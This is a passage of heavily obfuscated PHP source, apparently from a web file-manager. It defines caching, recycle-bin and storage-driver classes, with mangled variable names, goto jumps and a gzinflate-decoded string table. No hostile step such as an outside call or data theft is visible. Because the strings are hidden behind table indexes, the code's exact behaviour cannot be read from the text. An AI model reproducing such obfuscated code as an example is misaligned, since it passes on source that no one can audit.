self::$memoryCache[$ÖÂÀùÔ]; } public static function set($ù×È²ßÜ, $Ì™±¯, $ï¿…Ê = false) { $ÌöÎì¹› = self::key($ù×È²ßÜ); if (isset(self::$memoryCache[$ÌöÎì¹›]) && self::$memoryCache[$ÌöÎì¹›] === $Ì™±¯) { return !0; } if ($ï¿…Ê === 0) { self::$memoryCache[$ÌöÎì¹›] = $Ì™±¯; return !0; } CacheLock::lock($ù×È²ßÜ); $µ…ª­äõ = self::init()->set($ÌöÎì¹›, serialize($Ì™±¯), $ï¿…Ê); self::$memoryCache[$ÌöÎì¹›] = $Ì™±¯; CacheLock::unlock($ù×È²ßÜ); return $µ…ª­äõ; } public static function getCall($ª¨à¸ã, $ÊÊ²·âÆ, $şÉÇ»º®, $êÜÅæ—† = array()) { $î£¹ÀÕÒ =& $_SERVER[¹ş¤¶ĞÖ]; $Ù½é£È = self::get($ª¨à¸ã); if ($Ù½é£È || $Ù½é£È === $î£¹ÀÕÒ[12]) { return $Ù½é£È; } $Ù½é£È = call_user_func_array($şÉÇ»º®, $êÜÅæ—†); $Ù½é£È = $Ù½é£È ? $Ù½é£È : $î£¹ÀÕÒ[12]; self::set($ª¨à¸ã, $Ù½é£È, $ÊÊ²·âÆ); return $Ù½é£È; } public static function remove($ÈÏÒÀ¥“) { $ÑÅŠŞş = self::key($ÈÏÒÀ¥“); unset(self::$memoryCache[$ÑÅŠŞş]); self::clearTimeout(); CacheLock::lock($ÈÏÒÀ¥“); $¡”ó Ô = self::init()->remove($ÑÅŠŞş); CacheLock::unlock($ÈÏÒÀ¥“); return $¡”ó Ô; } public static function removeMemory($ÌËˆÙ) { $ã«Ê­ÉÒ = self::key($ÌËˆÙ); unset(self::$memoryCache[$ã«Ê­ÉÒ]); } public static function clearMemory($¥Ñ¦¹’’ = false) { if ($¥Ñ¦¹’’) { $¥Ñ¦¹’’ = self::key($¥Ñ¦¹’’); unset(self::$memoryCache[$¥Ñ¦¹’’]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[¹ş¤¶ĞÖ][858])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[¹ş¤¶ĞÖ][859])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($´¥¦„®, $Ÿ«¸±Ş) { $ñªÕÄ»¹ =& $_SERVER[¹ş¤¶ĞÖ]; $this->cachePath = $´¥¦„®[$ñªÕÄ»¹[84]]; $this->prefix = $ñªÕÄ»¹[860]; $this->cacheTime = $Ÿ«¸±Ş; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($‚ç†‹£¹) { $í«ÏÖé§ =& $_SERVER[¹ş¤¶ĞÖ]; $‚ç†‹£¹ = str_replace(array($í«ÏÖé§[861], $í«ÏÖé§[97], $í«ÏÖé§[73]), $í«ÏÖé§[862], $‚ç†‹£¹); return $this->cachePath . $í«ÏÖé§[863] . $‚ç†‹£¹ . $í«ÏÖé§[864]; } public function set($ÊÛ«Šúæ, $ò‰ªêµ, $¬€¤õô­ = false) { $¬€¤õô­ = $¬€¤õô­ ? $¬€¤õô­ : $this->cacheTime; $Ù·âÉ¤ˆ = $this->getFile($ÊÛ«Šúæ); if (file_put_contents($Ù·âÉ¤ˆ, $this->prefix . $ò‰ªêµ, LOCK_EX)) { @touch($Ù·âÉ¤ˆ, intval(time() + $¬€¤õô­)); clearstatcache(); return !0; } @unlink($Ù·âÉ¤ˆ); return !1; } public function get($î»‹˜¹Â) { $é¬ØÅ® = $this->getFile($î»‹˜¹Â); if (file_exists($é¬ØÅ®) && filemtime($é¬ØÅ®) < time()) { @unlink($é¬ØÅ®); return !1; } $Ã¹à„¼ = @file_get_contents($é¬ØÅ®); return substr($Ã¹à„¼, strlen($this->prefix)); } public function remove($Ñİ” ˆÊ) { $õ ôÆŒá = $this->getFile($Ñİ” ˆÊ); return @unlink($õ ôÆŒá); } public function deleteAll() { $‘è®Š€Ê =& $_SERVER[¹ş¤¶ĞÖ]; $Ş­ŠÅ¹¤ = scandir($this->cachePath); foreach ($Ş­ŠÅ¹¤ as $Â¡Ñî¯¾) { $Õ§ÇÆº = $this->cachePath . $Â¡Ñî¯¾; if (strpos($Õ§ÇÆº, $‘è®Š€Ê[864]) && strpos($Õ§ÇÆº, $‘è®Š€Ê[865])) { @unlink($Õ§ÇÆº); } } } public function clearTimeout() { $Ö€›“ü¯ =& $_SERVER[¹ş¤¶ĞÖ]; $¤×€³·î = scandir($this->cachePath); foreach ($¤×€³·î as $“ñçç¦“) { $õ¥ñÖ°ş = $this->cachePath . $“ñçç¦“; if (strpos($õ¥ñÖ°ş, $Ö€›“ü¯[864]) && strpos($õ¥ñÖ°ş, $Ö€›“ü¯[865]) && filemtime($õ¥ñÖ°ş) < time()) { @unlink($õ¥ñÖ°ş); } } } } goto cëéé©ááá; Aå„‡Ø¬¡–: define($_SERVER[¹ş¤¶ĞÖ][0], $_SERVER[¹ş¤¶ĞÖ][1]); $_SERVER[øØ“¾à”] = explode($_SERVER[¹ş¤¶ĞÖ][2], gzinflate(substr($_SERVER[¹ş¤¶ĞÖ][3], 10, -8))); function binCheckEq($ÔÕ£ˆ…†, $ıâÀŒ¥) { return $ÔÕ£ˆ…† == $ıâÀŒ¥; } goto E¯‰Áïí¬; aš©øÌ•¡Ü: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\165\x72\x63\x65\137\x72\145\143\171\x63\x6c\x65"; protected $dataAuto = array(array("\x63\x72\145\141\164\145\124\x69\x6d\x65", "\x74\x69\x6d\x65", "\x69\156\163\145\x72\164", "\x66\165\x6e\143\164\151\157\156")); public function listData($˜öŞøîå = false) { $­Í¤¯½§ =& $_SERVER[¹ş¤¶ĞÖ]; $˜öŞøîå = $˜öŞøîå ? $˜öŞøîå : USER_ID; $á·ğÛí¹ = $this->where(array($­Í¤¯½§[1667] => $˜öŞøîå))->select(); return array_to_keyvalue($á·ğÛí¹, $­Í¤¯½§[12], $­Í¤¯½§[431]); } public function moveToRecycle($ÊÌÉûÎØ) { $ƒĞ³ÙÂÉ =& $_SERVER[¹ş¤¶ĞÖ]; $şâ…×ÙÔ = Model($ƒĞ³ÙÂÉ[1366]); $ú»€ğÒê = $şâ…×ÙÔ->sourceInfo($ÊÌÉûÎØ); if (!$ú»€ğÒê || $ú»€ğÒê[$ƒĞ³ÙÂÉ[460]] == $ƒĞ³ÙÂÉ[88]) { return; } $¡ÙÖé¨˜ = array($ƒĞ³ÙÂÉ[446] => $ÊÌÉûÎØ, $ƒĞ³ÙÂÉ[1667] => USER_ID, $ƒĞ³ÙÂÉ[605] => $ú»€ğÒê[$ƒĞ³ÙÂÉ[440]], $ƒĞ³ÙÂÉ[606] => $ú»€ğÒê[$ƒĞ³ÙÂÉ[525]], $ƒĞ³ÙÂÉ[609] => $ú»€ğÒê[$ƒĞ³ÙÂÉ[540]]); $this->add($¡ÙÖé¨˜); $this->recycleMove($ÊÌÉûÎØ, 1); if ($ú»€ğÒê[$ƒĞ³ÙÂÉ[439]] == $ƒĞ³ÙÂÉ[88]) { $ğä–ÛÏÒ = array($ƒĞ³ÙÂÉ[609] => array($ƒĞ³ÙÂÉ[569], $ú»€ğÒê[$ƒĞ³ÙÂÉ[540]] . $ÊÌÉûÎØ . $ƒĞ³ÙÂÉ[570])); $şâ…×ÙÔ->where($ğä–ÛÏÒ)->setField($ƒĞ³ÙÂÉ[460], 1); } } public function clear() { $this->remove(!1); } public function remove($¾…Š‘Å½ = false, $ª£Öõ®ç = false) { $Òêœ‚ç¹ =& $_SERVER[¹ş¤¶ĞÖ]; $ª£Öõ®ç = $ª£Öõ®ç ? $ª£Öõ®ç : USER_ID; $õÁİÇÂ– = Model($Òêœ‚ç¹[1366]); $ê—Á¡’ = $this->listData($ª£Öõ®ç); $¾…Š‘Å½ = $¾…Š‘Å½ === !1 ? !1 : $¾…Š‘Å½; $”´¨«€ = array(); foreach ($ê—Á¡’ as $¢øçÓ  ) { if ($¾…Š‘Å½ != !1 && !in_array($¢øçÓ  , $¾…Š‘Å½)) { continue; } $âÂñô¼È = $õÁİÇÂ–->sourceInfo($¢øçÓ  ); $õÁİÇÂ–->remove($¢øçÓ  , !1); $‘ÉêŞö = $âÂñô¼È[$Òêœ‚ç¹[440]] . $Òêœ‚ç¹[11] . $âÂñô¼È[$Òêœ‚ç¹[525]]; $”´¨«€[$‘ÉêŞö] = array($Òêœ‚ç¹[605] => $âÂñô¼È[$Òêœ‚ç¹[440]], $Òêœ‚ç¹[525] => $âÂñô¼È[$Òêœ‚ç¹[525]]); $this->where(array($Òêœ‚ç¹[431] => $¢øçÓ  ))->delete(); } foreach ($”´¨«€ as $úñÀ Ñ) { $õÁİÇÂ–->targetSpaceUpdate($úñÀ Ñ[$Òêœ‚ç¹[440]], $úñÀ Ñ[$Òêœ‚ç¹[525]]); } } public function restore($¡ø‡í¢¦ = false) { $ü¥ë ­ = $this->listData(); $this->_restoreSource($ü¥ë ­, $¡ø‡í¢¦); } public function removeUserAll($ÌÓ‘ ‚–) { $this->remove(!1, $ÌÓ‘ ‚–); } private function _restoreSource($ş¥·é‰Ç, $°»õØ¦Ö) { $úèà”†ü =& $_SERVER[¹ş¤¶ĞÖ]; $ŠÇ¶«¶Ô = Model($úèà”†ü[1366]); $°»õØ¦Ö = $°»õØ¦Ö == !1 ? !1 : $°»õØ¦Ö; if (!$ş¥·é‰Ç) { return !0; } $Ùõ’ŞĞ‡ = array(); foreach ($ş¥·é‰Ç as $È²Õ‰Úã) { if ($°»õØ¦Ö != !1 && !in_array($È²Õ‰Úã, $°»õØ¦Ö)) { continue; } $ğ¬¸¡Á® = $ŠÇ¶«¶Ô->sourceInfo($È²Õ‰Úã); $Üí¿ÛÆ = $ŠÇ¶«¶Ô->sourceInfo($ğ¬¸¡Á®[$úèà”†ü[461]]); if ($Üí¿ÛÆ[$úèà”†ü[460]] == $úèà”†ü[88]) { continue; } $ŠÇ¶«¶Ô->lockMoveStart($È²Õ‰Úã); $this->recycleMove($È²Õ‰Úã, 0); if ($ğ¬¸¡Á®[$úèà”†ü[439]] == $úèà”†ü[88]) { $¬ë…Ÿ˜û = array($úèà”†ü[609] => array($úèà”†ü[569], $ğ¬¸¡Á®[$úèà”†ü[540]] . $È²Õ‰Úã . $úèà”†ü[570])); $ŠÇ¶«¶Ô->where($¬ë…Ÿ˜û)->setField($úèà”†ü[460], 0); $this->restoreFolderChildren($È²Õ‰Úã, $ş¥·é‰Ç); } $this->where(array($úèà”†ü[431] => $È²Õ‰Úã))->delete(); $ŠÇ¶«¶Ô->folderSizeReset($ğ¬¸¡Á®[$úèà”†ü[461]]); $Ùõ’ŞĞ‡[] = $ğ¬¸¡Á®[$úèà”†ü[461]]; if ($ğ¬¸¡Á®[$úèà”†ü[439]] == $úèà”†ü[88]) { $Ùõ’ŞĞ‡[] = $È²Õ‰Úã; } $ŠÇ¶«¶Ô->lockMoveEnd($È²Õ‰Úã); } $ŠÇ¶«¶Ô->updateModifyTime($Ùõ’ŞĞ‡); } private function restoreFolderChildren($¡äÇå’×, $œÁ ß•´) { $®üÔ¾Û =& $_SERVER[¹ş¤¶ĞÖ]; $¥íüÑí = Model($®üÔ¾Û[1366]); $½æŸş»ó = array($®üÔ¾Û[431] => array($®üÔ¾Û[7], array())); foreach ($œÁ ß•´ as $ò‹»ñş˜) { if ($ò‹»ñş˜ == $¡äÇå’×) { continue; } if (!$¥íüÑí->isParentOf($¡äÇå’×, $ò‹»ñş˜)) { continue; } $ÒÒüÕé = $¥íüÑí->sourceInfo($ò‹»ñş˜); if ($ÒÒüÕé[$®üÔ¾Û[439]] == $®üÔ¾Û[88]) { $½æŸş»ó[] = array($®üÔ¾Û[609] => array($®üÔ¾Û[569], $ÒÒüÕé[$®üÔ¾Û[540]] . $ò‹»ñş˜ . $®üÔ¾Û[570])); } else { $½æŸş»ó[$®üÔ¾Û[431]][1][] = $ò‹»ñş˜; } } if (!$½æŸş»ó[$®üÔ¾Û[431]][1]) { unset($½æŸş»ó[$®üÔ¾Û[431]]); } if (!$½æŸş»ó) { return; } $½æŸş»ó[$®üÔ¾Û[431]][1] = array_unique($½æŸş»ó[$®üÔ¾Û[431]][1]); $½æŸş»ó[$®üÔ¾Û[1033]] = $®üÔ¾Û[1964]; $¥íüÑí->where($½æŸş»ó)->setField($®üÔ¾Û[460], 1); } private function recycleMove($Ëƒ´…—½, $şñÑè·¿ = 1) { $˜ç¾½ªÛ =& $_SERVER[¹ş¤¶ĞÖ]; $Ş›¼¥ªÑ = Model($˜ç¾½ªÛ[1366]); $íµ£™°© = Model($˜ç¾½ªÛ[2180]); $Ì†ñ‘¢… = array($˜ç¾½ªÛ[431] => $Ëƒ´…—½); if ($şñÑè·¿) { $Ş›¼¥ªÑ->where($Ì†ñ‘¢…)->setField($˜ç¾½ªÛ[460], 1); $íµ£™°©->eventRecycle($Ëƒ´…—½, $˜ç¾½ªÛ[2181]); } else { $‡›Ïáü = $Ş›¼¥ªÑ->where($Ì†ñ‘¢…)->find(); $ö¿ãºÖİ = $‡›Ïáü[$˜ç¾½ªÛ[439]] == $˜ç¾½ªÛ[88]; $´Õú¨« = $Ş›¼¥ªÑ->fileNameAuto($‡›Ïáü[$˜ç¾½ªÛ[461]], $‡›Ïáü[$˜ç¾½ªÛ[32]], REPEAT_RENAME_FOLDER, $ö¿ãºÖİ); if ($´Õú¨« != $‡›Ïáü[$˜ç¾½ªÛ[32]]) { $Ş›¼¥ªÑ->rename($Ëƒ´…—½, $´Õú¨«); } $Ş›¼¥ªÑ->where($Ì†ñ‘¢…)->setField($˜ç¾½ªÛ[460], 0); $íµ£™°©->eventRecycle($Ëƒ´…—½, $˜ç¾½ªÛ[2182]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\x6d\56\163\157\165\x72\x63\145\x53\145\143\x72\x65\164\x4c\x69\x73\x74"; public $field = array("\163\x6f\165\162\x63\x65\111\104", "\x74\x79\160\x65\111\x44", "\x63\x72\145\x61\x74\145\x55\x73\145\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\x6d\56\x73\164\157\x72\141\147\x65\x4c\151\163\x74"; public $field = array("\x6e\x61\x6d\x65", "\163\151\172\x65\115\x61\x78", "\163\171\163\164\145\155", "\144\145\146\x61\165\x6c\x74", "\x64\x72\x69\x76\145\162", "\x63\x6f\156\146\x69\x67"); public function listData($ÏÇø·¨é = false, $‚’İĞ˜ø = "\x6d\157\x64\151\x66\x79\x54\151\155\x65", $Ì‘‡š— = false) { $äÙ×ë² =& $_SERVER[¹ş¤¶ĞÖ]; $æ²¦©¿· = parent::listData($ÏÇø·¨é, $‚’İĞ˜ø, $Ì‘‡š—); if ($ÏÇø·¨é) { return $æ²¦©¿·; } $­üÚ‹ã› = $this->ioSizeUseGet(array_to_keyvalue($æ²¦©¿·, $äÙ×ë²[12], $äÙ×ë²[428])); foreach ($æ²¦©¿· as $—ü¨€»é => $½Ş¿¨ıÌ) { unset($æ²¦©¿·[$—ü¨€»é][$äÙ×ë²[6]]); $æ²¦©¿·[$—ü¨€»é][$äÙ×ë²[1855]] = isset($­üÚ‹ã›[$½Ş¿¨ıÌ[$äÙ×ë²[428]]]) ? $­üÚ‹ã›[$½Ş¿¨ıÌ[$äÙ×ë²[428]]] : 0; } return $æ²¦©¿·; } public function ioSizeUseGet($Íò–İÙ¾) { $ÉôîĞ´Ó =& $_SERVER[¹ş¤¶ĞÖ]; if (!$Íò–İÙ¾) { return array(); } $ÆÏÕÏˆõ = $ÉôîĞ´Ó[2183] . implode($ÉôîĞ´Ó[50], $Íò–İÙ¾); $› ô°Ô = Cache::get($ÆÏÕÏˆõ); if ($› ô°Ô) { return $› ô°Ô; } $®…Ğ°è± = array($ÉôîĞ´Ó[843] => $ÉôîĞ´Ó[428], $ÉôîĞ´Ó[2184] => $ÉôîĞ´Ó[76]); $˜úÂøíÉ = array($ÉôîĞ´Ó[843] => array($ÉôîĞ´Ó[7], $Íò–İÙ¾)); $› ô°Ô = Model($ÉôîĞ´Ó[815])->field($®…Ğ°è±)->where($˜úÂøíÉ)->group($ÉôîĞ´Ó[843])->select(); $› ô°Ô = array_to_keyvalue($› ô°Ô, $ÉôîĞ´Ó[428], $ÉôîĞ´Ó[76]); Cache::set($ÆÏÕÏˆõ, $› ô°Ô, 600); return $› ô°Ô; } public function getConfig($°Á£È¥‰) { $ò¼‡ù»æ = parent::listData($°Á£È¥‰); return json_decode($ò¼‡ù»æ[$_SERVER[¹ş¤¶ĞÖ][6]], !0); } public function update($ç–úûÊ§, $š¶š¬ê) { $š¾îË°„ =& $_SERVER[¹ş¤¶ĞÖ]; $©¥ñ››ó = $š¶š¬ê[$š¾îË°„[32]]; $ñªáØå­ = array_to_keyvalue(parent::listData(), $š¾îË°„[32]); if (isset($ñªáØå­[$©¥ñ››ó]) && $ñªáØå­[$©¥ñ››ó][$š¾îË°„[428]] != $ç–úûÊ§) { return !1; } $this->checkPwd($ç–úûÊ§, $š¶š¬ê); if (isset($š¶š¬ê[$š¾îË°„[2185]]) && $š¶š¬ê[$š¾îË°„[2185]] == $š¾îË°„[88]) { $this->checkConfig($š¶š¬ê); } unset($š¶š¬ê[$š¾îË°„[2185]]); $Ô™¨‚¸¿ = parent::update($ç–úûÊ§, $š¶š¬ê); if ($Ô™¨‚¸¿ && $š¶š¬ê[$š¾îË°„[37]]) { $óñ³üÒÚ = 0; foreach ($ñªáØå­ as $±äşèØ®) { if ($±äşèØ®[$š¾îË°„[37]] && $±äşèØ®[$š¾îË°„[428]] != $ç–úûÊ§) { $óñ³üÒÚ = $±äşèØ®[$š¾îË°„[428]]; parent::update($±äşèØ®[$š¾îË°„[428]], array($š¾îË°„[37] => 0)); } } $this->updateBackup($ç–úûÊ§, $óñ³üÒÚ); } return $Ô™¨‚¸¿; } public function add($©İùìÌä) { $¡Ï»ÑÀŸ =& $_SERVER[¹ş¤¶ĞÖ]; $Ÿ÷ı¨Ù’ = array_to_keyvalue(parent::listData(), $¡Ï»ÑÀŸ[32]); if (isset($Ÿ÷ı¨Ù’[$©İùìÌä[$¡Ï»ÑÀŸ[32]]])) { return !1; } $this->checkConfig($©İùìÌä); $üğ‰Ù±‹ = parent::insert($©İùìÌä); if ($üğ‰Ù±‹ && $©İùìÌä[$¡Ï»ÑÀŸ[37]]) { foreach ($Ÿ÷ı¨Ù’ as $¦ñÇãæì) { if ($¦ñÇãæì[$¡Ï»ÑÀŸ[37]]) { parent::update($¦ñÇãæì[$¡Ï»ÑÀŸ[428]], array($¡Ï»ÑÀŸ[37] => 0)); } } } return $üğ‰Ù±‹; } public function updateBackup($¿†š¤ÍÌ, $½‡ø–Î¥) { $Êò¸Õ¿® =& $_SERVER[¹ş¤¶ĞÖ]; if (!$½‡ø–Î¥) { return; } $©€ë³¡ = Model($Êò¸Õ¿®[775])->config(); if ($©€ë³¡[$Êò¸Õ¿®[1646]] != $Êò¸Õ¿®[88] || $©€ë³¡[$Êò¸Õ¿®[777]] != $½‡ø–Î¥) { return; } $à‚©´ñ = Model($Êò¸Õ¿®[796])->get($Êò¸Õ¿®[806]); $à‚©´ñ = json_decode($à‚©´ñ, !0); if (!$à‚©´ñ) { return; } $à‚©´ñ[$Êò¸Õ¿®[777]] = $¿†š¤ÍÌ; Model($Êò¸Õ¿®[796])->set(array($Êò¸Õ¿®[806] => $à‚©´ñ)); } public function checkPwd($“‘Û»¬í, &$«°äº»ü) { $Ø—§˜˜ê =& $_SERVER[¹ş¤¶ĞÖ]; if (empty($«°äº»ü[$Ø—§˜˜ê[6]])) { return; } $±óº³úª = json_decode($«°äº»ü[$Ø—§˜˜ê[6]], !0); $¤µ¿ÜâÏ = $Ø—§˜˜ê[12]; $¿Û”Èç = array($Ø—§˜˜ê[2186], $Ø—§˜˜ê[2187], $Ø—§˜˜ê[920]); foreach ($¿Û”Èç as $ˆ­õ¿£ç) { if (isset($±óº³úª[$ˆ­õ¿£ç])) { $¤µ¿ÜâÏ = $ˆ­õ¿£ç; break; } } if (!$¤µ¿ÜâÏ) { return; } $’‰°Ğ° = $this->getConfig($“‘Û»¬í); $Î‚¤£ç± = $’‰°Ğ°[$¤µ¿ÜâÏ]; $œ¼–Èù¼ = $±óº³úª[$¤µ¿ÜâÏ]; if ($œ¼–Èù¼ == str_repeat($Ø—§˜˜ê[189], strlen($Î‚¤£ç±))) { $±óº³úª[$¤µ¿ÜâÏ] = $Î‚¤£ç±; $«°äº»ü[$Ø—§˜˜ê[6]] = json_encode($±óº³úª); } else { if ($œ¼–Èù¼ != $Î‚¤£ç±) { $«°äº»ü[$Ø—§˜˜ê[2185]] = $Ø—§˜˜ê[88]; } } } public function checkConfig(&$¿êÔí³õ, $ÕŒ±¶¡ = false) { $§é‘à° =& $_SERVER[¹ş¤¶ĞÖ]; $ÉŞ¬ÅÀä = strtolower($¿êÔí³õ[$§é‘à°[95]]); $¨ÆÒá˜¨ = json_decode($¿êÔí³õ[$§é‘à°[6]], !0); foreach ($¨ÆÒá˜¨ as $Ìéà¾´¢ => $Öâª¹¢™) { $¨ÆÒá˜¨[$Ìéà¾´¢] = trim($Öâª¹¢™); } $¨ÆÒá˜¨[$§é‘à°[2188]] = rand_string(6); $Ù€¢˜¸… = $GLOBALS[$§é‘à°[6]][$§é‘à°[89]][$§é‘à°[852]]; $Ö’°õ›ƒ = isset($Ù€¢˜¸…[$ÉŞ¬ÅÀä]) ? $Ù€¢˜¸…[$ÉŞ¬ÅÀä] : ucfirst($ÉŞ¬ÅÀä); $Ô¤ò«õè = $§é‘à°[74] . $Ö’°õ›ƒ; if (!$Ö’°õ›ƒ || !class_exists($Ô¤ò«õè)) { if ($ÕŒ±¶¡) { return LNG($§é‘à°[2189]); } write_log(array($§é‘à°[2190], $¿êÔí³õ, get_caller_info()), $§é‘à°[2191]); show_json(LNG($§é‘à°[2189]), !1, $¿êÔí³õ); } $–Ê÷Àßö = new $Ô¤ò«õè($¨ÆÒá˜¨); if (in_array($ÉŞ¬ÅÀä, $–Ê÷Àßö->objectDriver)) { if (!$–Ê÷Àßö->isBucketCors() && !$–Ê÷Àßö->setBucketCors()) { $³»â±Ùç = LNG($§é‘à°[2192]); $³»â±Ùç .= $§é‘à°[2193] . LNG($§é‘à°[2194]); if ($ÕŒ±¶¡) { return $³»â±Ùç; } show_json($³»â±Ùç, !1); } } $Â¢é™”¶ = rtrim($¨ÆÒá˜¨[$§é‘à°[1213]], $§é‘à°[8]) . $§é‘à°[8]; $º«¬–×Æ = $–Ê÷Àßö->getPath($Â¢é™”¶ . $§é‘à°[1217]); if (!$–Ê÷Àßö->mkfile($º«¬–×Æ)) { if ($ÕŒ±¶¡) { return LNG($§é‘à°[2192]); } show_json(LNG($§é‘à°[2192]), !1); } $¨ÆÒá˜¨[$§é‘à°[1213]] = $Â¢é™”¶; $¿êÔí³õ[$§é‘à°[6]] = json_encode($¨ÆÒá˜¨); $¿êÔí³õ[$§é‘à°[95]] = $Ö’°õ›ƒ; return !0; } public function driverListSystem() { $ı³œÀŠ¡ =& $_SERVER[¹ş¤¶ĞÖ]; $«Ç¬úÜ¾ = parent::listData(); $Æì³ˆ»Ş = array(); foreach ($«Ç¬úÜ¾ as $¹”ÍıË™) { unset($¹”ÍıË™[$ı³œÀŠ¡[201]], $¹”ÍıË™[$ı³œÀŠ¡[85]]); $¹”ÍıË™[$ı³œÀŠ¡[6]] = json_decode($¹”ÍıË™[$ı³œÀŠ¡[6]], !0); $Æì³ˆ»Ş[] = $¹”ÍıË™; } return $Æì³ˆ»Ş; } public function defaultDriver() { $ãœªÔ À =& $_SERVER[¹ş¤¶ĞÖ]; $‡ÖÛùÇ‡ = parent::listData(); $œ¢¦¡Ë× = array_filter_by_field($‡ÖÛùÇ‡, $ãœªÔ À[37], 1); $œ¢¦¡Ë× = $œ¢¦¡Ë×[0]; if ($œ¢¦¡Ë×) { $œ¢¦¡Ë×[$ãœªÔ À[6]] = json_decode($œ¢¦¡Ë×[$ãœªÔ À[6]], !0); } return $œ¢¦¡Ë×; } public function driverInfo($ïˆØî¹Ò) { $‰‰…×Óà =& $_SERVER[¹ş¤¶ĞÖ]; $õÓöùµÖ = array_to_keyvalue(parent::listData(), $‰‰…×Óà[428]); if (!isset($õÓöùµÖ[$ïˆØî¹Ò])) { return !1; } $ŠêÎüÚ€ = $õÓöùµÖ[$ïˆØî¹Ò]; $ŠêÎüÚ€[$‰‰…×Óà[6]] = json_decode($ŠêÎüÚ€[$‰‰…×Óà[6]], !0); return $ŠêÎüÚ€; } public function remove($õåÃ—óœ) { $this->removeShareItems($õåÃ—óœ); return parent::remove($õåÃ—óœ); } public function removeWithFile($ÒâåÂ´, $ëé—ø—ë) { $•»‰¯¨Ö =& $_SERVER[¹ş¤¶ĞÖ]; $òÚï©”› = array($•»‰¯¨Ö[843] => $ÒâåÂ´); $Ã¬²ûÁ = Model($•»‰¯¨Ö[500])->where($òÚï©”›)->count(); $ƒ–âÊ¯ = Model($•»‰¯¨Ö[500])->where($òÚï©”›)->sum($•»‰¯¨Ö[76]); $ÙæâÒı­ = $ëé—ø—ë . $•»‰¯¨Ö[2195] . $ÒâåÂ´; $Œ‘ç‰Ã‰ = LNG($ëé—ø—ë == $•»‰¯¨Ö[577] ? $•»‰¯¨Ö[2196] : $•»‰¯¨Ö[2197]); $¢–Ğš†³ = new TaskFileTransfer($ÙæâÒı­, $•»‰¯¨Ö[2191], $Ã¬²ûÁ, $Œ‘ç‰Ã‰ . "\50{$ÒâåÂ´}\51"); $¢–Ğš†³->task[$•»‰¯¨Ö[789]] = (double) $ƒ–âÊ¯; $û³úõ” = KodIO::defaultDriver(); $²Â“ç = $û³úõ”[$•»‰¯¨Ö[428]]; $íş€ÉãĞ = "\173\151\157\x3a{$²Â“ç}\175\57"; $Ó£ÙÎó„ = !0; $“ò¡Äı = array(); $À©Îñ·ç = Model($•»‰¯¨Ö[200])->where($òÚï©”›)->field($•»‰¯¨Ö[2198])->select(); foreach ($À©Îñ·ç as $õë´÷íê) { $ÌìğÅ³ = $õë´÷íê[$•»‰¯¨Ö[84]]; $Œ½çì¾ = $íş€ÉãĞ . str_replace("\x7b\x69\157\x3a{$ÒâåÂ´}\175\x2f", $•»‰¯¨Ö[12], $ÌìğÅ³); if (!IO::exist($ÌìğÅ³)) { $“ò¡Äı[] = $õë´÷íê[$•»‰¯¨Ö[497]]; $¢–Ğš†³->updateFileEnd($õë´÷íê[$•»‰¯¨Ö[32]], $õë´÷íê[$•»‰¯¨Ö[76]]); continue; } if (IO::exist($Œ½çì¾)) { $¢–Ğš†³->updateFileEnd($õë´÷íê[$•»‰¯¨Ö[32]], $õë´÷íê[$•»‰¯¨Ö[76]]); continue; } if (!IO::move($ÌìğÅ³, get_path_father($Œ½çì¾))) { $Ó£ÙÎó„ = !1; break; } $òÚï©”› = array($•»‰¯¨Ö[497] => $õë´÷íê[$•»‰¯¨Ö[497]]); $ßØğû× = array($•»‰¯¨Ö[843] => $²Â“ç, $•»‰¯¨Ö[84] => $Œ½çì¾); Model($•»‰¯¨Ö[200])->where($òÚï©”›)->save($ßØğû×); } $this->removeByFileID($“ò¡Äı); if (!$Ó£ÙÎó„) { $¢–Ğš†³->stop($ÙæâÒı­); return !1; } $¢–Ğš†³->end(); if ($ëé—ø—ë == $•»‰¯¨Ö[1835]) { $this->remove($ÒâåÂ´); } } public function progress($·ÚüØ, $¯”€¤¹¬) { return Task::get($¯”€¤¹¬ . $_SERVER[¹ş¤¶ĞÖ][2195] . $·ÚüØ); } private function removeByFileID($–ûÁ´üÜ = array()) { $àŸÁ«™« =& $_SERVER[¹ş¤¶ĞÖ]; if (empty($–ûÁ´üÜ)) { return; } $Ş½ÍÄªë = array($àŸÁ«™«[497] => array($àŸÁ«™«[7], $–ûÁ´üÜ)); $ğ’íÅİˆ = Model($àŸÁ«™«[1366])->where($Ş½ÍÄªë)->field($àŸÁ«™«[431])->select(); if (!$ğ’íÅİˆ) { return; } $ğ’íÅİˆ = array_to_keyvalue($ğ’íÅİˆ, $àŸÁ«™«[12], $àŸÁ«™«[431]); foreach ($ğ’íÅİˆ as $¨ïé—ï) { Model($àŸÁ«™«[445])->removeNow($¨ïé—ï, !1); } } private function removeShareItems($¹’å…æ ) { $®¤±àÄ” =& $_SERVER[¹ş¤¶ĞÖ]; $èÑ™¡öß = "\173\x69\157\72{$¹’å…æ }\x7d\57"; $­¼Üâõñ = array($®¤±àÄ”[431] => 0, $®¤±àÄ”[1208] => array($®¤±àÄ”[412], "{$èÑ™¡öß}\x25")); $àãÉñ”Œ = Model($®¤±àÄ”[1846])->where($­¼Üâõñ)->field($®¤±àÄ”[622])->select(); if (empty($àãÉñ”Œ)) { return; } $®Â±¯µ“ = array_to_keyvalue($àãÉñ”Œ, $®¤±àÄ”[12], $®¤±àÄ”[622]); Model($®¤±àÄ”[621])->remove($®Â±¯µ“); } } goto a„Ã‘–¯Ó«; D–¿õ„£¼: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Â¦°×) { $this->pathParse = $Â¦°×; $this->model = Model($_SERVER[¹ş¤¶ĞÖ][1366]); } public function getPath($°şÛÚÅÌ) { return trim($°şÛÚÅÌ, $_SERVER[¹ş¤¶ĞÖ][8]); } public function pathFather($–ˆ†Úäª) { $­á®´ÍÓ = $this->parse($–ˆ†Úäª); $­á®´ÍÓ = $this->infoSimple($–ˆ†Úäª); return $­á®´ÍÓ ? 